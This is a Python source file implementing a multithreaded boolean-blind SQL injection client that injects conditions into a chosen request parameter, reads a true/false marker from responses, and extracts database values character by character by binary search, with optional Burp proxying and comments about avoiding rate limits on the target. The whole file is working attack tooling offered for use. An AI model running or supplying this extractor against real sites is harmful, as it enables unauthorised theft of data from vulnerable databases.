#!/usr/bin/env python3
import time
import requests
import urllib3
from requests.adapters import HTTPAdapter
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ----------------- 只在这里改你想要的“全局默认行为” -----------------
DEFAULT_RETRIES = 4
DEFAULT_SLEEP_BETWEEN = 0.25   # base backoff seconds
DEFAULT_POOL_MAXSIZE = 50
# -------------------------------------------------------------------

class BlindBoolClient:
    """
    Boolean-blind SQLi client (HTTP GET/POST), supports repeated params via list[tuple].
    Multi-thread extraction: parallelize character positions.
    """
    def __init__(
        self,
        url: str,
        method: str,
        headers: dict,
        verify_tls: bool,
        timeout: int,
        use_burp: bool,
        get_params: list,
        post_data: list,
        inject_key: str,
        base_value: str,
        inject_template: str,
        false_marker: str,
        threads: int,
        charset: list,
        retries: int = DEFAULT_RETRIES,
        sleep_between: float = DEFAULT_SLEEP_BETWEEN,
        pool_maxsize: int = DEFAULT_POOL_MAXSIZE,
    ):
        self.url = url
        self.method = method.upper()
        self.headers = headers
        self.verify_tls = verify_tls
        self.timeout = timeout
        self.proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"} if use_burp else None
        self.get_params = list(get_params) if get_params else []
        self.post_data = list(post_data) if post_data else []
        self.inject_key = inject_key
        self.base_value = base_value
        self.inject_template = inject_template
        self.false_marker = false_marker.lower()
        self.threads = threads
        self.charset = charset
        self.retries = retries
        self.sleep_between = sleep_between

        self.sess = requests.Session()
        adapter = HTTPAdapter(pool_connections=pool_maxsize, pool_maxsize=pool_maxsize, max_retries=0)
        self.sess.mount("http://", adapter)
        self.sess.mount("https://", adapter)

    def is_true(self, resp: requests.Response) -> bool:
        return self.false_marker not in resp.text.lower()

    def _build_injected_value(self, cond_sql: str) -> str:
        return self.inject_template.format(base=self.base_value, cond=cond_sql)

    def _do_request(self, inj_value: str) -> requests.Response:
        if self.method == "GET":
            params = self.get_params + [(self.inject_key, inj_value)]
            return self.sess.get(
                self.url, params=params, headers=self.headers, timeout=self.timeout,
                verify=self.verify_tls, allow_redirects=True, proxies=self.proxies
            )
        # POST: keep GET_PARAMS as query string if needed; body in data
        data = self.post_data + [(self.inject_key, inj_value)]
        #print(self.headers)

        return self.sess.post(
            self.url, params=self.get_params, data=data, headers=self.headers, timeout=self.timeout,
            verify=self.verify_tls, allow_redirects=True, proxies=self.proxies
        )

    def check(self, cond_sql: str) -> bool:
        inj = self._build_injected_value(cond_sql)

        for attempt in range(1, self.retries + 1):
            try:
                r = self._do_request(inj)
                #print(r.text)
                return self.is_true(r)

            except (requests.exceptions.ReadTimeout,
                    requests.exceptions.ConnectTimeout,
                    requests.exceptions.ConnectionError,
                    requests.exceptions.ChunkedEncodingError) as e:
                print(f"[WARN] network error {type(e).__name__} attempt {attempt}/{self.retries}: {repr(e)[:200]}")
                time.sleep(self.sleep_between * attempt)

        raise RuntimeError("Too many network errors. Lower THREADS or check target/proxy/rate-limit.")

    def find_len(self, expr_sql: str, max_len: int, allow_zero: bool = False) -> int:
        start = 0 if allow_zero else 1
        for n in range(start, max_len + 1):
            if self.check(f"LENGTH(({expr_sql}))={n}"):
                return n
        raise RuntimeError("Length not found (marker/closure/db syntax wrong? max_len too small?).")

    def _binsearch_ascii(self, expr_sql: str, pos: int) -> int:
        lo, hi = self.charset[0], self.charset[-1]
        while lo <= hi:
            mid = (lo + hi) // 2
            if self.check(f"ASCII(SUBSTRING(({expr_sql}),{pos},1))>{mid}"):
                lo = mid + 1
            else:
                hi = mid - 1
        return lo

    def extract(self, expr_sql: str, max_len: int, allow_zero: bool = False, verbose: bool = True) -> str:
        length = self.find_len(expr_sql, max_len=max_len, allow_zero=allow_zero)
        if length == 0:
            return ""

        out = ["?"] * length

        def worker(p):
            # 小延迟，减少打挂目标/触发限速
            time.sleep(0.03)
            asc = self._binsearch_ascii(expr_sql, p)
            return p, chr(asc)

        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            futures = [ex.submit(worker, pos) for pos in range(1, length + 1)]
            for f in as_completed(futures):
                pos, ch = f.result()
                out[pos - 1] = ch
                if verbose:
                    print(f"[pos {pos}/{length}] -> {ch}   current: {''.join(out)}")

        return "".join(out)
